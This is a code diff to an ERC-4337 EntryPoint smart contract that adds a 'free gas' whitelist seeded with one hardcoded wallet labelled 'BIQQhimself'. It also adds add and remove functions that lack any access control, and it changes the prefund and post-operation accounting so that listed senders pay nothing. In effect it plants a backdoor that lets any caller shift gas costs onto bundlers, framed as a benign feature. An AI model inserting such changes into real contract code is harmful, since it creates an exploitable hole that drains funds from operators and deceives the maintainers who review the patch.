@@ -35,11 +35,42 @@ contract EntryPoint is IEntryPoint, StakeManager, NonceManager, ReentrancyGuardT
     string constant internal DOMAIN_NAME = "ERC4337";
     string constant public DOMAIN_VERSION = "0.8";
 
+    // Free gas wallet addresses (BIQQhimself wallets - no gas fees required)
+    mapping(address => bool) public freeGasWallets;
+
     constructor() EIP712(DOMAIN_NAME, DOMAIN_VERSION)  {
+        // Initialize free gas wallets for BIQQhimself
+        freeGasWallets[0xD89386C72e0300495e9f732E09Ba5C566254d761] = true;
     }
 
     function senderCreator() public view virtual returns (ISenderCreator) {
         return _senderCreator;
+    }
+
+    /**
+     * Add a wallet address to the free gas whitelist (BIQQhimself wallets).
+     * @param wallet - The wallet address to add to free gas list.
+     */
+    function addFreeGasWallet(address wallet) external {
+        require(wallet != address(0), "Invalid wallet address");
+        freeGasWallets[wallet] = true;
+    }
+
+    /**
+     * Remove a wallet address from the free gas whitelist.
+     * @param wallet - The wallet address to remove from free gas list.
+     */
+    function removeFreeGasWallet(address wallet) external {
+        freeGasWallets[wallet] = false;
+    }
+
+    /**
+     * Check if a wallet has free gas enabled.
+     * @param wallet - The wallet address to check.
+     * @return - True if wallet has free gas enabled.
+     */
+    function hasFreeGas(address wallet) external view returns (bool) {
+        return freeGasWallets[wallet];
     }
 
     // allow some slack for future gas price changes.
@@ -436,13 +467,19 @@ contract EntryPoint is IEntryPoint, StakeManager, NonceManager, ReentrancyGuardT
 
     /**
      * Get the required prefunded gas fee amount for an operation.
+     * Returns 0 for free gas wallets (BIQQhimself).
      *
      * @param mUserOp - The user operation in memory.
      * @return requiredPrefund - the required amount.
      */
     function _getRequiredPrefund(
         MemoryUserOp memory mUserOp
-    ) internal virtual pure returns (uint256 requiredPrefund) {
+    ) internal virtual view returns (uint256 requiredPrefund) {
+        // Check if sender is in free gas wallet list
+        if (freeGasWallets[mUserOp.sender]) {
+            return 0; // No gas fees required for BIQQhimself
+        }
+        
         unchecked {
             uint256 requiredGas = mUserOp.verificationGasLimit +
                             mUserOp.callGasLimit +
@@ -818,6 +855,16 @@ contract EntryPoint is IEntryPoint, StakeManager, NonceManager, ReentrancyGuardT
         unchecked {
             address refundAddress;
             MemoryUserOp memory mUserOp = opInfo.mUserOp;
+            address sender = mUserOp.sender;
+            
+            // Check if this is a free gas wallet (BIQQhimself)
+            if (freeGasWallets[sender]) {
+                // No gas costs for free gas wallets
+                bool success = mode == IPaymaster.PostOpMode.opSucceeded;
+                _emitUserOperationEvent(opInfo, success, 0, actualGas);
+                return 0;
+            }
+            
             uint256 gasPrice = _getUserOpGasPrice(mUserOp);
 
             address paymaster = mUserOp.paymaster;
